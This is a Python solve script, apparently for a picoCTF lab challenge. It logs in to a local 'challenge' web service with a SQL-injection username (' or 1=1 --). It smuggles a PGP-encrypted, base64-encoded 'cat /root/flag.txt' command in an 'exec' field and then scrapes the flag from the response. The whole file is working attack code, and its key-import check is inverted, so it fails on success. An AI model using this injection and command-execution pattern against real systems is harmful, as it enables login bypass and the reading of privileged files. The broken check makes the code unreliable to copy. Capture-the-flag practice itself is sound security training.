import requests
import base64
import re
import gnupg

def main():
    gpg = gnupg.GPG()


    public_key = """-----BEGIN PGP PUBLIC KEY BLOCK-----

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
mE8UlYTG5CwAwT07fNvUq8Fs5EvjLmpkzw==
=fQy7
-----END PGP PUBLIC KEY BLOCK-----"""
    
    import_result = gpg.import_keys(public_key)

    if not import_result.counts['imported'] == 0:
        raise ValueError("Failed to import public key.")

    recipient = import_result.fingerprints[0]

    command = "cat /root/flag.txt"
    encrypted_data = gpg.encrypt(command, recipient, always_trust=True)
    
    if encrypted_data.ok:
        encrypted_str = str(encrypted_data)
        encoded_data = base64.b64encode(encrypted_str.encode()).decode()
    else:
        print("Encryption failed:")
        print(encrypted_data.status)
    
    url = "http://challenge:5000/login"
    data = {'username': '\' or 1=1 --','password': 'temp','exec': encoded_data}
    r = requests.post(url, data=data)

    response = r.text
    
    pattern = "picoCTF{.*}"
    flag = re.search(pattern, response)

    with open("./flag", "w") as w:
        w.write(flag.group(0))

if __name__ == "__main__":
    main()